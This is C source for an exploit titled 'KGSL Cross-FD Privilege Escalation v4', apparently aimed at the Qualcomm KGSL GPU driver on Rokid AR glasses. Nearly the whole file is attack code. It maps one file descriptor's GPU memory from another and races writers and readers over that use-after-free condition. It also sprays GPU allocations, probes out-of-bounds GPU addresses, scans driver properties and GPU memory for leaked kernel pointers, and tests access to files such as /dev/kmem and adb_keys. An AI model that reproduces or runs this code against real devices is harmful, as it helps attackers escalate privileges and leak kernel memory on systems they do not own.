/*
 * KGSL Cross-FD Privilege Escalation v4
 * ======================================
 *
 * Based on confirmed findings:
 * 1. Cross-FD access works with gpuaddr in 0x4000000000 range
 * 2. After fd1 closes, fd2 can still access the memory (UAF condition)
 * 3. GPU memory exists in separate address space, not kernel heap
 *
 * New strategy: Use GPU memory as a primitive for:
 * 1. Cross-process data exfiltration (if another process uses GPU)
 * 2. GPU command buffer corruption
 * 3. Kernel info leak via GPU registers/properties
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_privesc_v4 kgsl_privesc_v4.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09
#define IOCTL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct device_getproperty)

struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

// ============================================================================
// Globals
// ============================================================================

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read64(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

int safe_write64(void *ptr, uint64_t val)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *(volatile uint64_t *)ptr = val;
        return 0;
    }
    return -1;
}

void hexdump(const char *desc, const void *data, size_t size)
{
    const uint8_t *p = (const uint8_t *)data;
    printf("%s:\n", desc);
    for (size_t i = 0; i < size && i < 128; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

// ============================================================================
// GPU Memory Functions
// ============================================================================

int gpumem_alloc(int fd, uint64_t size, uint64_t *gpuaddr_out)
{
    struct gpumem_alloc_req req = {0};
    req.size = size;
    if (ioctl(fd, IOCTL_GPUMEM_ALLOC, &req) == 0)
    {
        *gpuaddr_out = req.gpuaddr;
        return 0;
    }
    return -1;
}

void *gpumem_mmap(int fd, uint64_t gpuaddr, size_t size)
{
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, gpuaddr);
}

// ============================================================================
// Attack 1: Cross-FD UAF with Racing
// ============================================================================

static volatile int race_stop = 0;
static volatile int race_hits = 0;

void *writer_thread(void *arg)
{
    void *ptr = arg;
    uint64_t counter = 0;

    while (!race_stop)
    {
        if (safe_write64(ptr, 0xDEAD000000000000ULL | counter) == 0)
        {
            counter++;
        }
        usleep(1);
    }
    return NULL;
}

void *reader_thread(void *arg)
{
    void *ptr = arg;

    while (!race_stop)
    {
        uint64_t val;
        if (safe_read64(ptr, &val) == 0)
        {
            if ((val & 0xFFFF000000000000ULL) == 0xDEAD000000000000ULL)
            {
                race_hits++;
            }
        }
        usleep(1);
    }
    return NULL;
}

void test_race_condition(void)
{
    printf("\n=== Test 1: Cross-FD Race Condition ===\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);

    if (fd1 < 0 || fd2 < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    uint64_t gpuaddr;
    if (gpumem_alloc(fd1, 0x1000, &gpuaddr) < 0)
    {
        printf("[-] Alloc failed\n");
        close(fd1);
        close(fd2);
        return;
    }
    printf("[+] fd1 allocated: gpuaddr=0x%lx\n", gpuaddr);

    void *ptr1 = gpumem_mmap(fd1, gpuaddr, 0x1000);
    if (ptr1 == MAP_FAILED)
    {
        printf("[-] fd1 mmap failed\n");
        close(fd1);
        close(fd2);
        return;
    }

    // fd2 needs its own allocation for mmap to work
    uint64_t gpuaddr2;
    gpumem_alloc(fd2, 0x1000, &gpuaddr2);

    // fd2 maps fd1's memory
    void *ptr2 = gpumem_mmap(fd2, gpuaddr, 0x1000);
    if (ptr2 == MAP_FAILED)
    {
        printf("[-] fd2 mmap failed\n");
        munmap(ptr1, 0x1000);
        close(fd1);
        close(fd2);
        return;
    }
    printf("[+] fd2 mapped fd1's memory at %p\n", ptr2);

    // Start racing
    race_stop = 0;
    race_hits = 0;

    pthread_t t1, t2;
    pthread_create(&t1, NULL, writer_thread, ptr1);
    pthread_create(&t2, NULL, reader_thread, ptr2);

    usleep(100000); // 100ms
    race_stop = 1;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    printf("[+] Race hits: %d\n", race_hits);

    if (race_hits > 0)
    {
        printf("[!!!] Cross-FD memory access confirmed during race!\n");
    }

    munmap(ptr1, 0x1000);
    munmap(ptr2, 0x1000);
    close(fd1);
    close(fd2);
}

// ============================================================================
// Attack 2: Scan /proc/pid/maps for KGSL mappings
// ============================================================================

void scan_proc_maps(void)
{
    printf("\n=== Test 2: Scan System KGSL Mappings ===\n");

    DIR *proc = opendir("/proc");
    if (!proc)
    {
        printf("[-] Cannot open /proc\n");
        return;
    }

    int found = 0;
    struct dirent *entry;

    while ((entry = readdir(proc)) != NULL)
    {
        if (entry->d_type != DT_DIR)
            continue;

        // Check if numeric (PID)
        int is_pid = 1;
        for (int i = 0; entry->d_name[i]; i++)
        {
            if (entry->d_name[i] < '0' || entry->d_name[i] > '9')
            {
                is_pid = 0;
                break;
            }
        }
        if (!is_pid)
            continue;

        char maps_path[256];
        snprintf(maps_path, sizeof(maps_path), "/proc/%s/maps", entry->d_name);

        FILE *f = fopen(maps_path, "r");
        if (!f)
            continue;

        char line[512];
        while (fgets(line, sizeof(line), f))
        {
            if (strstr(line, "kgsl") || strstr(line, "40000") ||
                strstr(line, "adreno"))
            {
                if (found < 20)
                {
                    printf("[*] PID %s: %s", entry->d_name, line);
                }
                found++;
            }
        }

        fclose(f);
    }

    closedir(proc);
    printf("[*] Found %d KGSL-related mappings\n", found);
}

// ============================================================================
// Attack 3: GPU Property Deep Scan
// ============================================================================

void deep_property_scan(int fd)
{
    printf("\n=== Test 3: Deep GPU Property Scan ===\n");

    uint8_t buf[4096];
    int interesting = 0;

    for (unsigned int type = 0; type <= 0x50; type++)
    {
        memset(buf, 0, sizeof(buf));

        struct device_getproperty prop = {
            .type = type,
            .value = buf,
            .sizebytes = sizeof(buf)};

        if (ioctl(fd, IOCTL_DEVICE_GETPROPERTY, &prop) == 0)
        {
            // Scan for kernel pointers
            uint64_t *vals = (uint64_t *)buf;
            for (int i = 0; i < 512; i++)
            {
                if ((vals[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL ||
                    (vals[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF8000000000ULL)
                {
                    printf("[!!!] Property 0x%02x has kernel ptr at +%d: 0x%lx\n",
                           type, i * 8, vals[i]);
                    interesting++;
                }
            }

            // Check for interesting strings
            for (int i = 0; i < 4000; i++)
            {
                if (buf[i] >= 0x20 && buf[i] <= 0x7e)
                {
                    int len = 0;
                    while (i + len < 4096 && buf[i + len] >= 0x20 && buf[i + len] <= 0x7e)
                    {
                        len++;
                    }
                    if (len >= 8)
                    {
                        char str[65];
                        memcpy(str, &buf[i], len < 64 ? len : 64);
                        str[len < 64 ? len : 64] = 0;
                        printf("[*] Property 0x%02x string at +%d: \"%s\"\n",
                               type, i, str);
                        i += len;
                        interesting++;
                    }
                }
            }
        }
    }

    printf("[*] Found %d interesting items\n", interesting);
}

// ============================================================================
// Attack 4: Massive GPU Memory Spray
// ============================================================================

void massive_spray(int fd)
{
    printf("\n=== Test 4: Massive GPU Memory Spray ===\n");

#define SPRAY_COUNT 500
    uint64_t gpuaddrs[SPRAY_COUNT];
    void *ptrs[SPRAY_COUNT];
    int count = 0;

    // Spray many allocations
    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        if (gpumem_alloc(fd, 0x10000, &gpuaddrs[count]) == 0)
        {
            ptrs[count] = gpumem_mmap(fd, gpuaddrs[count], 0x10000);
            if (ptrs[count] != MAP_FAILED)
            {
                // Write pattern
                memset(ptrs[count], 'A' + (i % 26), 0x100);
                count++;
            }
        }
    }

    printf("[+] Sprayed %d GPU memory regions\n", count);

    // Calculate total GPU memory used
    uint64_t total_mem = (uint64_t)count * 0x10000;
    printf("[+] Total GPU memory: %lu MB\n", total_mem / (1024 * 1024));

    // Scan for kernel pointers in GPU memory
    int kernel_ptrs = 0;
    for (int i = 0; i < count; i++)
    {
        uint64_t *p = (uint64_t *)ptrs[i];
        for (int j = 0; j < 0x10000 / 8; j++)
        {
            uint64_t val;
            if (safe_read64(&p[j], &val) == 0)
            {
                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL)
                {
                    if (kernel_ptrs < 10)
                    {
                        printf("[!!!] Kernel ptr in alloc %d +0x%x: 0x%lx\n",
                               i, j * 8, val);
                    }
                    kernel_ptrs++;
                }
            }
        }
    }

    printf("[*] Found %d potential kernel pointers\n", kernel_ptrs);

    // Show GPU address range
    if (count > 0)
    {
        printf("[*] GPU addr range: 0x%lx - 0x%lx\n",
               gpuaddrs[0], gpuaddrs[count - 1]);
    }

    // Cleanup
    for (int i = 0; i < count; i++)
    {
        munmap(ptrs[i], 0x10000);
    }
}

// ============================================================================
// Attack 5: Test if we can access GPU addresses outside our allocation range
// ============================================================================

void test_oob_access(int fd)
{
    printf("\n=== Test 5: Out-of-Bounds GPU Address Access ===\n");

    uint64_t base_addr;
    if (gpumem_alloc(fd, 0x1000, &base_addr) < 0)
    {
        printf("[-] Alloc failed\n");
        return;
    }

    printf("[+] Base allocation at 0x%lx\n", base_addr);

    // Try to access addresses before and after our allocation
    uint64_t test_addrs[] = {
        base_addr - 0x10000,
        base_addr - 0x1000,
        base_addr + 0x1000,
        base_addr + 0x10000,
        base_addr + 0x100000,
        0x4000000000ULL, // Start of GPU range
        0x4000001000ULL,
        0x4000010000ULL,
        0x4001000000ULL,
    };

    int success = 0;
    for (size_t i = 0; i < sizeof(test_addrs) / sizeof(test_addrs[0]); i++)
    {
        void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, test_addrs[i]);
        if (ptr != MAP_FAILED)
        {
            uint64_t val;
            if (safe_read64(ptr, &val) == 0)
            {
                printf("[+] Accessed 0x%lx: value=0x%lx\n", test_addrs[i], val);
                success++;
            }
            else
            {
                printf("[*] Mapped 0x%lx but read failed\n", test_addrs[i]);
            }
            munmap(ptr, 0x1000);
        }
    }

    printf("[*] Successfully accessed %d OOB addresses\n", success);
}

// ============================================================================
// Attack 6: Check /dev permissions and other interesting files
// ============================================================================

void check_system_files(void)
{
    printf("\n=== Test 6: System File Access ===\n");

    const char *files[] = {
        "/dev/kgsl-3d0",
        "/dev/ion",
        "/dev/dma_heap/system",
        "/dev/ashmem",
        "/dev/binder",
        "/dev/hwbinder",
        "/dev/vndbinder",
        "/dev/kmsg",
        "/dev/mem",
        "/dev/kmem",
        "/sys/kernel/debug/kgsl",
        "/sys/kernel/debug/gpu",
        "/proc/kgsl",
        "/sys/class/kgsl",
        "/data/local.prop",
        "/data/misc/adb/adb_keys",
    };

    for (size_t i = 0; i < sizeof(files) / sizeof(files[0]); i++)
    {
        struct stat st;
        if (stat(files[i], &st) == 0)
        {
            printf("[+] %s: mode=%o uid=%d gid=%d\n",
                   files[i], st.st_mode & 0777, st.st_uid, st.st_gid);

            // Try to open
            int fd = open(files[i], O_RDWR);
            if (fd >= 0)
            {
                printf("    [!!!] Writable!\n");
                close(fd);
            }
            else
            {
                fd = open(files[i], O_RDONLY);
                if (fd >= 0)
                {
                    printf("    [*] Readable\n");
                    close(fd);
                }
            }
        }
    }
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Cross-FD Privilege Escalation v4                        ║\n");
    printf("║  Target: Rokid AR Glasses                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] kgsl_fd = %d\n", fd);

    // Run all tests
    test_race_condition();
    scan_proc_maps();
    deep_property_scan(fd);
    massive_spray(fd);
    test_oob_access(fd);
    check_system_files();

    close(fd);

    printf("\n=== Research Complete ===\n");
    return 0;
}
